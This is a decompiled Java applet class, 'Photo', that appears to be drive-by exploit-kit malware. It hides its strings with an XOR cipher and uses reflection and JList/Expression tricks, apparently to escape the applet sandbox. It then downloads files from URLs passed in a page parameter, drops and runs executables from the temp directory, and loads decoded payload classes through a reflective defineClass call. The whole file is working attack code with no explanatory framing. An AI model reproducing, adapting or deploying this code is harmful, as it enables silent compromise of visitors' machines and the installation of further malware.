import java.lang.reflect.Method;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.InputStream;
import java.awt.Component;
import java.beans.Expression;
import java.util.HashSet;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Photo extends Applet
{
    public String r;
    public String g;
    public String c;
    public String j;
    public String W;
    public String d;
    public String s;
    public String O;
    public String A;
    public String y;
    public String S;
    public String e;
    public String h;
    public String F;
    public String V;
    public String ab;
    public String T;
    public String b;
    public String v;
    public String R;
    public String p;
    public String x;
    public String f;
    public String i;
    public String U;
    public String N;
    public String X;
    public String u;
    public String G;
    public String E;
    public String n;
    public String t;
    public String K;
    public String Q;
    public String k;
    public String P;
    public String M;
    public String Y;
    public String l;
    public String z;
    public String C;
    public String B;
    public String J;
    public String q;
    public String I;
    public String w;
    public Class a;
    public Class m;
    boolean D;
    public JList H;
    public HashSet Z;
    public static boolean L;
    public static int o;
    private static final String[] bb;
    
    public void a() throws Exception {
        this.a = Integer.TYPE;
        this.m = Character.TYPE;
    }
    
    public String a(final String s, final String s2, final String s3) throws Exception {
        final int o = Photo.o;
        String s4 = "";
        int i = 0;
        while (i < (int)s3.getClass().getMethod(this.M, (Class<?>[])new Class[0]).invoke(s3, new Object[0])) {
            final String s5 = s;
            Label_0280: {
                Object invoke = null;
                Label_0275: {
                    Integer n;
                    try {
                        if (o != 0) {
                            return s5;
                        }
                        n = (Integer)(invoke = s.getClass().getMethod(this.Y, this.a).invoke(s, (Character)s3.getClass().getMethod(this.l, this.a).invoke(s3, i)));
                        if (o != 0) {
                            break Label_0275;
                        }
                    }
                    catch (Exception ex) {
                        throw ex;
                    }
                    final int intValue;
                    if ((intValue = n) < 0) {
                        break Label_0280;
                    }
                    invoke = s4.getClass().getMethod(this.v, s4.getClass()).invoke(s4, (String)s4.getClass().getMethod(this.E, this.m).invoke(s4.getClass(), (Character)s2.getClass().getMethod(this.l, this.a).invoke(s2, intValue)));
                }
                s4 = (String)invoke;
            }
            ++i;
            if (o != 0) {
                break;
            }
        }
        return s4;
    }
    
    public Object[] a(final Object o) throws Exception {
        return (Object[])this.a(this.d, this.t, new Class[] { this.b((Object)this.d) }, o, new Object[] { Photo.bb[4] });
    }
    
    public String toString() {
        try {
            this.a(this.getParameter("p"));
            return "";
        }
        catch (Exception ex) {
            return "";
        }
    }
    
    private void c() {
        try {
            this.a();
            final Object a = this.a(this.V, this.G, new Class[] { this.b((Object)this.d) }, this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(this.V, new Class[0]), new Object[] { new Object[0] }), new Object[] { this.C });
            this.a(this.A, this.i, new Class[] { this.b((Object)this.d) }, a, new Object[] { this.q });
            this.a(this.e, Photo.bb[59], new Class[] { this.b((Object)Photo.bb[54]) }, this, new Object[] { this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(this.S, this.b((Object)this.b(this.s))), new Object[] { { { this.a(this.y, this.U, new Class[] { this.b((Object)this.d), this.b((Object)this.b(this.s)) }, a, new Object[] { this.N, { this } }) } } }) });
        }
        catch (Exception ex) {}
    }
    
    public Photo(final String s) {
        this.r = Photo.bb[40];
        this.g = Photo.bb[37];
        this.c = Photo.bb[32];
        this.j = Photo.bb[33];
        this.W = Photo.bb[35];
        this.d = Photo.bb[52];
        this.s = Photo.bb[43];
        this.O = Photo.bb[42];
        this.A = Photo.bb[6];
        this.y = Photo.bb[8];
        this.S = Photo.bb[14];
        this.e = Photo.bb[24];
        this.h = Photo.bb[54];
        this.F = Photo.bb[49];
        this.V = Photo.bb[38];
        this.ab = Photo.bb[44];
        this.T = Photo.bb[48];
        this.b = Photo.bb[15];
        this.v = Photo.bb[16];
        this.R = Photo.bb[27];
        this.p = Photo.bb[18];
        this.x = Photo.bb[45];
        this.f = Photo.bb[7];
        this.i = Photo.bb[5];
        this.U = Photo.bb[46];
        this.N = Photo.bb[20];
        this.X = Photo.bb[9];
        this.u = Photo.bb[47];
        this.G = Photo.bb[56];
        this.E = Photo.bb[41];
        this.n = Photo.bb[50];
        this.t = Photo.bb[39];
        this.K = Photo.bb[29];
        this.Q = Photo.bb[12];
        this.k = Photo.bb[51];
        this.P = Photo.bb[13];
        this.M = Photo.bb[21];
        this.Y = Photo.bb[17];
        this.l = Photo.bb[22];
        this.z = Photo.bb[10];
        this.C = Photo.bb[19];
        this.B = Photo.bb[53];
        this.J = Photo.bb[26];
        this.q = Photo.bb[11];
        this.I = Photo.bb[31];
        this.w = Photo.bb[36];
        this.D = false;
        this.Z = new HashSet();
        try {
            this.a();
            this.c(s);
        }
        catch (Exception ex) {}
    }
    
    public Photo() {
        final int o = Photo.o;
        this.r = Photo.bb[40];
        this.g = Photo.bb[37];
        this.c = Photo.bb[32];
        this.j = Photo.bb[33];
        this.W = Photo.bb[35];
        this.d = Photo.bb[52];
        this.s = Photo.bb[43];
        this.O = Photo.bb[42];
        this.A = Photo.bb[6];
        this.y = Photo.bb[8];
        this.S = Photo.bb[14];
        this.e = Photo.bb[24];
        this.h = Photo.bb[54];
        this.F = Photo.bb[49];
        this.V = Photo.bb[38];
        this.ab = Photo.bb[44];
        this.T = Photo.bb[48];
        this.b = Photo.bb[15];
        this.v = Photo.bb[16];
        this.R = Photo.bb[27];
        this.p = Photo.bb[18];
        this.x = Photo.bb[45];
        this.f = Photo.bb[7];
        this.i = Photo.bb[5];
        this.U = Photo.bb[46];
        this.N = Photo.bb[20];
        this.X = Photo.bb[9];
        this.u = Photo.bb[47];
        this.G = Photo.bb[56];
        this.E = Photo.bb[41];
        this.n = Photo.bb[50];
        this.t = Photo.bb[39];
        this.K = Photo.bb[29];
        this.Q = Photo.bb[12];
        this.k = Photo.bb[51];
        this.P = Photo.bb[13];
        this.M = Photo.bb[21];
        this.Y = Photo.bb[17];
        this.l = Photo.bb[22];
        this.z = Photo.bb[10];
        this.C = Photo.bb[19];
        this.B = Photo.bb[53];
        this.J = Photo.bb[26];
        this.q = Photo.bb[11];
        this.I = Photo.bb[31];
        this.w = Photo.bb[36];
        this.D = false;
        this.Z = new HashSet();
        if (this.D) {
            return;
        }
        try {
            final String[] split;
            final String[] array = split = System.getProperty(Photo.bb[25]).split(Photo.bb[28]);
            Photo photo = null;
            Label_0875: {
                boolean equals = false;
                Label_0571: {
                    try {
                        equals = split[1].equals("6");
                        if (o != 0) {
                            break Label_0571;
                        }
                        if (!equals) {
                            break Label_0571;
                        }
                    }
                    catch (Exception ex) {
                        throw ex;
                    }
                    Label_0556: {
                        String[] array2;
                        boolean equals2;
                        try {
                            array2 = array;
                            final int n = 2;
                            final String s = array2[n];
                            final String s2 = "_";
                            final String[] array3 = s.split(s2);
                            final int n2 = 1;
                            final String s3 = array3[n2];
                            final String[] array4 = Photo.bb;
                            final int n3 = 55;
                            final String s4 = array4[n3];
                            equals2 = s3.equals(s4);
                            final int n4 = o;
                            if (n4 == 0) {
                                break Label_0556;
                            }
                            break Label_0571;
                        }
                        catch (Exception ex2) {
                            throw ex2;
                        }
                        try {
                            final int n = 2;
                            final String s = array2[n];
                            final String s2 = "_";
                            final String[] array3 = s.split(s2);
                            final int n2 = 1;
                            final String s3 = array3[n2];
                            final String[] array4 = Photo.bb;
                            final int n3 = 55;
                            final String s4 = array4[n3];
                            s3.equals(s4);
                            final int n4 = o;
                            if (n4 != 0) {
                                break Label_0571;
                            }
                            if (!equals2) {
                                break Label_0571;
                            }
                        }
                        catch (Exception ex3) {
                            throw ex3;
                        }
                    }
                    try {
                        this.destroy();
                    }
                    catch (Exception ex4) {
                        throw ex4;
                    }
                    try {
                        this.D = array[1].equals("6");
                        photo = this;
                        if (o != 0) {
                            break Label_0875;
                        }
                        final boolean d = this.D;
                    }
                    catch (Exception ex5) {
                        throw ex5;
                    }
                }
                Label_0870: {
                    if (equals) {
                        break Label_0870;
                    }
                    this.a();
                    this.Z.add(this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(Photo.bb[23], new Class[] { this.b((Object)this.s), this.b((Object)this.d), this.b((Object)this.b(this.s)) }), new Object[] { { this.b((Object)this.W), this.z, new Object[1] } }));
                    final Expression expression = new Expression(this.b((Object)this.W), this.z, new Object[1]);
                    try {
                        this.add(this.H = new JList((E[])new Object[] { this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(Photo.bb[30], new Class[] { this.getClass(), this.b((Object)Photo.bb[34]) }), new Object[] { { this, this.Z } }) }));
                        if (o == 0) {
                            return;
                        }
                        photo = this;
                    }
                    catch (Exception ex6) {
                        throw ex6;
                    }
                }
            }
            photo.c();
        }
        catch (Exception ex7) {}
    }
    
    public void start() {
        Photo photo = this;
        Label_0018: {
            try {
                if (Photo.o != 0) {
                    break Label_0018;
                }
                if (this.D) {
                    return;
                }
            }
            catch (Exception ex) {
                throw ex;
            }
            try {
                photo = this;
                photo.a(this.getParameter("p"));
            }
            catch (Exception ex2) {}
        }
    }
    
    public String d() throws Exception {
        final int o = Photo.o;
        final Object[] a = this.a((Object)this.a(this.I, this.w, this.getParameter("p")));
        int i = 0;
        while (i < a.length) {
            this.d(((String[])a)[i]);
            ++i;
            if (o != 0) {
                break;
            }
        }
        return "";
    }
    
    public String c(String a) throws Exception {
        final int o = Photo.o;
        a = this.a(this.I, this.w, a);
        final Object[] a2 = this.a((Object)a);
        int i = 0;
        while (i < a2.length) {
            this.d(((String[])a2)[i]);
            ++i;
            if (o != 0) {
                break;
            }
        }
        return "";
    }
    
    public String b(final String s) {
        return String.format(Photo.bb[60], s);
    }
    
    public void e(final String s) {
        try {
            this.a(this.j, this.b, new Class[] { this.b((Object)this.d) }, this.a(this.j, this.P, this.b((Object)this.j)), new Object[] { s });
        }
        catch (Exception ex) {}
        try {
            this.a(this.j, this.b, new Class[] { this.b((Object)this.d) }, this.a(this.j, this.P, this.b((Object)this.j)), new Object[] { String.format(this.J, s) });
        }
        catch (Exception ex2) {}
    }
    
    public String b() {
        return System.getProperty(this.g) + Math.random() + this.B;
    }
    
    public Object a(final Object o, final Object o2, final Object o3) throws Exception {
        return this.b(o).getMethod((String)o2, (Class[])new Class[0]).invoke(o3, new Object[0]);
    }
    
    public Object a(final Object o, final Object o2, final Class[] array, final Object o3, final Object[] array2) throws Exception {
        return this.b(o).getMethod((String)o2, (Class[])array).invoke(o3, array2);
    }
    
    public Class b(final Object o) throws Exception {
        return Class.forName((String)o);
    }
    
    public Object a(final String s, final Class clazz) throws Exception {
        int o = Photo.o;
        Object invoke = clazz;
        Label_0125: {
            Label_0068: {
                try {
                    if (o != 0) {
                        break Label_0125;
                    }
                    if (clazz != null) {
                        break Label_0068;
                    }
                }
                catch (Exception ex) {
                    throw ex;
                }
                try {
                    return this.b((Object)this.F).getMethod(this.X, this.b((Object)this.b(this.F))).invoke(this.b((Object)s), clazz);
                }
                catch (Exception ex2) {
                    throw ex2;
                }
            }
            invoke = this.b((Object)this.F).getMethod(this.X, this.b((Object)this.b(this.F))).invoke(this.b((Object)s), new Class[] { clazz });
            try {
                if (Photo.L) {
                    Photo.o = ++o;
                }
            }
            catch (Exception ex3) {
                throw ex3;
            }
        }
        return invoke;
    }
    
    public Object a(final String s, final Class[] array) throws Exception {
        final int o = Photo.o;
        Object invoke = array;
        boolean i = false;
        Label_0138: {
            Label_0132: {
                boolean l = false;
                Label_0118: {
                    Label_0068: {
                        try {
                            if (o != 0) {
                                break Label_0118;
                            }
                            if (array != null) {
                                break Label_0068;
                            }
                        }
                        catch (Exception ex) {
                            throw ex;
                        }
                        try {
                            return this.b((Object)this.F).getMethod(this.X, this.b((Object)this.b(this.F))).invoke(this.b((Object)s), array);
                        }
                        catch (Exception ex2) {
                            throw ex2;
                        }
                    }
                    invoke = this.b((Object)this.F).getMethod(this.X, this.b((Object)this.b(this.F))).invoke(this.b((Object)s), array);
                    try {
                        if (o == 0) {
                            return invoke;
                        }
                        l = Photo.L;
                        if (l) {
                            break Label_0132;
                        }
                        break Label_0132;
                    }
                    catch (Exception ex3) {
                        throw ex3;
                    }
                }
                try {
                    if (l) {
                        i = false;
                        break Label_0138;
                    }
                }
                catch (Exception ex4) {
                    throw ex4;
                }
            }
            i = true;
        }
        Photo.L = i;
        return invoke;
    }
    
    private void a(final String s) {
        final int o = Photo.o;
        try {
            final Class<Photo> clazz = Photo.class;
            final String string = clazz.getName() + Photo.bb[3];
            final String string2 = clazz.getResource(string).toString();
            String string3 = (String)this.a(this.W, Photo.bb[1], new Class[] { this.g.getClass() }, this.W, new Object[] { this.g });
            Object a;
            final String s2 = (String)(a = string3);
            Label_0195: {
                Label_0132: {
                    try {
                        if (o != 0) {
                            break Label_0195;
                        }
                        if (s2.endsWith("\\")) {
                            break Label_0132;
                        }
                    }
                    catch (Exception ex) {
                        throw ex;
                    }
                    string3 += "\\";
                }
                a = this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(this.ab, this.b((Object)this.d)), new Object[] { { string2 } });
            }
            final InputStream inputStream = (InputStream)this.a(this.ab, this.k, a);
            final byte[] array = new byte[4096];
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(string3 + string));
        Label_0457:
            while (true) {
                int intValue;
                while ((intValue = (int)this.a(this.c, this.p, new Class[] { array.getClass(), this.a, this.a }, inputStream, new Object[] { array, 0, 4096 })) != -1) {
                    try {
                        this.a(Photo.bb[2], this.R, new Class[] { array.getClass(), this.a, this.a }, bufferedOutputStream, new Object[] { array, 0, intValue });
                        if (o != 0) {
                            break Label_0457;
                        }
                        if (o == 0) {
                            continue;
                        }
                    }
                    catch (Exception ex2) {
                        throw ex2;
                    }
                    break;
                    this.a(this.j, this.b, new Class[] { this.b((Object)this.d) }, this.a(this.j, this.P, this.b((Object)this.j)), new Object[] { Photo.bb[0] + string3 + " " + clazz.getName() + " " + s });
                    return;
                }
                this.a(this.c, this.n, inputStream);
                this.a(Photo.bb[2], this.n, bufferedOutputStream);
                continue Label_0457;
            }
        }
        catch (Exception ex3) {
            ex3.printStackTrace();
        }
    }
    
    public static void main(final String[] array) throws Exception {
        final String s = array[0];
        System.setProperty(Photo.bb[58], Photo.bb[57]);
        try {
            final Photo photo = new Photo(s);
        }
        catch (Exception ex) {}
    }
    
    public void d(final String s) {
        final int o = Photo.o;
        try {
            final String b = this.b();
            final Object a = this.a(this.ab, this.k, this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(this.ab, this.b((Object)this.d)), new Object[] { { s } }));
            final Object a2 = this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(this.T, this.a), new Object[] { { 4096 } });
            final byte[] array = new byte[4096];
        Label_0335:
            while (true) {
                int intValue;
                while ((intValue = (int)this.a(this.c, this.p, new Class[] { array.getClass(), this.a, this.a }, a, new Object[] { array, 0, 4096 })) != -1) {
                    try {
                        this.a(this.T, this.R, new Class[] { array.getClass(), this.a, this.a }, a2, new Object[] { array, 0, intValue });
                        if (o != 0) {
                            break Label_0335;
                        }
                        if (o == 0) {
                            continue;
                        }
                    }
                    catch (Exception ex) {
                        throw ex;
                    }
                    break;
                    final byte[] byteArray;
                    final byte[] array2 = byteArray = ((ByteArrayOutputStream)a2).toByteArray();
                    int n = 0;
                    Label_0522: {
                        Label_0376: {
                            byte[] array3 = null;
                            Label_0363: {
                                byte b2;
                                byte b3;
                                try {
                                    b2 = (byte)(n = byteArray[0]);
                                    if (o != 0) {
                                        break Label_0522;
                                    }
                                    b3 = 77;
                                    if (b2 == b3) {
                                        break Label_0363;
                                    }
                                    break Label_0522;
                                }
                                catch (Exception ex2) {
                                    throw ex2;
                                }
                                try {
                                    if (b2 != b3) {
                                        break Label_0522;
                                    }
                                    array3 = array2;
                                    final int n2 = 1;
                                    final byte b4;
                                    n = (b4 = array3[n2]);
                                    final int n3 = o;
                                    if (n3 == 0) {
                                        break Label_0376;
                                    }
                                    break Label_0522;
                                }
                                catch (Exception ex3) {
                                    throw ex3;
                                }
                            }
                            try {
                                final int n2 = 1;
                                final byte b4;
                                n = (b4 = array3[n2]);
                                final int n3 = o;
                                if (n3 != 0) {
                                    break Label_0522;
                                }
                                if (b4 != 90) {
                                    break Label_0522;
                                }
                            }
                            catch (Exception ex4) {
                                throw ex4;
                            }
                        }
                        final Object a3 = this.a(this.O, this.f, new Class[] { this.b((Object)this.b(this.s)) }, this.a(this.r, this.b((Object)this.d)), new Object[] { { b } });
                        try {
                            this.a(this.r, this.R, new Class[] { byte[].class }, a3, new Object[] { array2 });
                            this.a(this.r, this.K, a3);
                            this.a(this.r, this.n, a3);
                            this.e(b);
                            if (o == 0) {
                                return;
                            }
                            n = 86;
                        }
                        catch (Exception ex5) {
                            throw ex5;
                        }
                    }
                    byte b5 = (byte)n;
                    int i = 0;
                    while (i < array2.length) {
                        final byte b6 = (byte)(array2[i] ^ b5);
                        b5 = array2[i];
                        final byte[] array4 = array2;
                        try {
                            array4[i] = b6;
                            ++i;
                            if (o != 0) {
                                return;
                            }
                            if (o == 0) {
                                continue;
                            }
                        }
                        catch (Exception ex6) {
                            throw ex6;
                        }
                        break;
                    }
                    final Method declaredMethod = ClassLoader.class.getDeclaredMethod(Photo.bb[61], String.class, byte[].class, Integer.TYPE, Integer.TYPE);
                    declaredMethod.setAccessible(true);
                    ((Class)declaredMethod.invoke(this.getClass().getClassLoader(), Photo.bb[62], array2, 0, array2.length)).newInstance();
                    return;
                }
                this.a(this.c, this.n, a);
                continue Label_0335;
            }
        }
        catch (Exception ex7) {}
    }
    
    static {
        bb = new String[] { z(z("\u001d`;\u00128W,.\u0003o")), z(z("\u0010d9#=\u0018q(\u0001;\u000e")), z(z("\u001d`;\u0012a\u001enc<:\u0003q8\u0007\u001c\u0003s(\u0012\"")), z(z("Yb!\u0012<\u0004")), z(z("M;")), z(z("\u0012w,\u001f")), z(z("\u001d`;\u00127Yr.\u0001&\u0007uc ,\u0005h=\u0007\n\u0019f$\u001d*")), z(z("\u0019d::!\u0004u,\u001d,\u0012")), z(z("\u001d`;\u00127Yr.\u0001&\u0007uc:!\u0001n.\u0012-\u001bd")), z(z("\u0010d90 \u0019r9\u0001:\u0014u\"\u0001")), z(z("\u0004d9 *\u0014t?\u001a;\u000eL,\u001d.\u0010d?")), z(z("\u0011t#\u0010;\u001en#S;\u0018R9\u0001&\u0019fe\u0000;\u0005(6\u001arG:9\u001b&\u0004/9\u001c\u001c\u0003s$\u001d(W<m\u0015:\u0019b9\u001a \u0019)d\b&\u0011)$OrG(6\u0007=\u000ez'\u00129\u0016/!\u0012!\u0010/\u001e\n<\u0003d ]<\u0012u\u001e\u0016,\u0002s$\u00076:`#\u0012(\u0012se\u001d:\u001bmdH<\u0003sc\u0007 $u?\u001a!\u0010)dH2\u0014`9\u0010'_dd\b2\n:$XdLs(\u0007:\u0005omThL|v\u0016oJ!#\u00168WD?\u0001 \u0005)dH*Yl(\u0000<\u0016f(SrWu%\u001a<Ls(\u0007:\u0005om\u0016t\n")), z(z("\u0004t/\u0000;\u0005h#\u0014")), z(z("\u0010d9!:\u0019u$\u001e*")), z(z("\u001d`;\u00127Yr:\u001a!\u0010/\u0007?&\u0004u")), z(z("\u0012y(\u0010")), z(z("\u0014n#\u0010.\u0003")), z(z("\u001eo)\u001678g")), z(z("\u0005d,\u0017")), z(z("\u001dr")), z(z("\u0003n\u001e\u0007=\u001eo*")), z(z("\u001bd#\u0014;\u001f")), z(z("\u0014i,\u0001\u000e\u0003")), z(z("3s,\u0004")), z(z("\u001d`;\u0012a\u0016q=\u001f*\u0003/\f\u0003?\u001bd9")), z(z("\u001d`;\u0012a\u0001d?\u0000&\u0018o")), z(z("\u0005d*\u00009\u00052\u007fSb\u0004!oV<U")), z(z("\u0000s$\u0007*")), z(z("+/")), z(z("\u0011m8\u0000'")), z(z("1h(\u001f+")), z(z("\u0013N\u000f\u0012\u0015T'b\u001b-%y#IyEEyC\u0016>U\b=80t>\t\u001aDx;\u0016\u0017\u001bB\u00018\u001f\u0007,+>v1Pr\u0019 =fhD\u0019\u0003I?B\u0010\u0014Vu r64 \u001a>Yj")), z(z("\u001d`;\u0012a\u001enc:!\u0007t9 ;\u0005d,\u001e")), z(z("\u001d`;\u0012a\u001b`#\u0014a%t#\u0007&\u001ad")), z(z("\u001d`;\u0012a\u0002u$\u001fa?`>\u001b\u001c\u0012u")), z(z("\u001d`;\u0012a\u001b`#\u0014a$x>\u0007*\u001a")), z(z("FIu^\u0015.Nt\u0006\u001b0Hh7*\u0005k5&8\u0006^*5&QW9\u0000\"Em%\u001d9MJ\u0003$a2>&\u0003z\u0018P\u000f9x\u0014.~\u0012)\rS}+\u0003J@n y\u00135\u000e#\u0002\u0015x")), z(z("\u001d`;\u0012a\u001enc\u0007\"\u0007e$\u0001")), z(z("\u001d`;\u00127Yr.\u0001&\u0007uc ,\u0005h=\u0007\n\u0019f$\u001d*:`#\u0012(\u0012s")), z(z("\u0004q!\u001a;")), z(z("\u001d`;\u0012a\u001enc5&\u001bd\u0002\u0006;\u0007t9 ;\u0005d,\u001e")), z(z("\u0001`!\u0006*8g")), z(z("\u001d`;\u0012a\u001b`#\u0014a\u0005d+\u001f*\u0014uc0 \u0019r9\u0001:\u0014u\"\u0001")), z(z("\u001d`;\u0012a\u001b`#\u0014a8c'\u0016,\u0003")), z(z("\u001d`;\u0012a\u0019d9]\u001a%M")), z(z("\u0011n?\u001e.\u0003")), z(z("\u001eo;\u001c$\u0012G8\u001d,\u0003h\"\u001d")), z(z("\u0010d9#.\u0005` \u0016;\u0012s")), z(z("\u001d`;\u0012a\u001enc16\u0003d\f\u0001=\u0016x\u0002\u0006;\u0007t9 ;\u0005d,\u001e")), z(z("\u001d`;\u0012a\u001b`#\u0014a4m,\u0000<")), z(z("\u0014m\"\u0000*")), z(z("\u0018q(\u001d\u001c\u0003s(\u0012\"")), z(z("\u001d`;\u0012a\u001b`#\u0014a$u?\u001a!\u0010")), z(z("A6+DyYd5\u0016")), z(z("\u001d`;\u0012a\u0016v9]\f\u0018l=\u001c!\u0012o9")), z(z("E8")), z(z("\u0010d96!\u0010h#\u0016\r\u000eO,\u001e*")), z(z("\u0003s8\u0016")), z(z("\u001d`;\u0012a\u0019d9]:\u0004d\u001e\n<\u0003d #=\u0018y$\u0016<")), z(z("\u0016e)")), z(z(",Mh\u0000t")), z(z("\u0013d+\u001a!\u0012B!\u0012<\u0004")), z(z("\u0005d ")) };
    }
    
    private static char[] z(final String s) {
        final char[] charArray = s.toCharArray();
        if (charArray.length < 2) {
            final int n = 0;
            charArray[n] ^= 'O';
        }
        return charArray;
    }
    
    private static String z(final char[] array) {
        final int i = array.length;
        for (int n = 0; i > n; ++n) {
            final int n2 = n;
            final char c = array[n2];
            char c2 = '\0';
            switch (n % 5) {
                case 0: {
                    c2 = 'w';
                    break;
                }
                case 1: {
                    c2 = '\u0001';
                    break;
                }
                case 2: {
                    c2 = 'M';
                    break;
                }
                case 3: {
                    c2 = 's';
                    break;
                }
                default: {
                    c2 = 'O';
                    break;
                }
            }
            array[n2] = (char)(c ^ c2);
        }
        return new String(array).intern();
    }
}
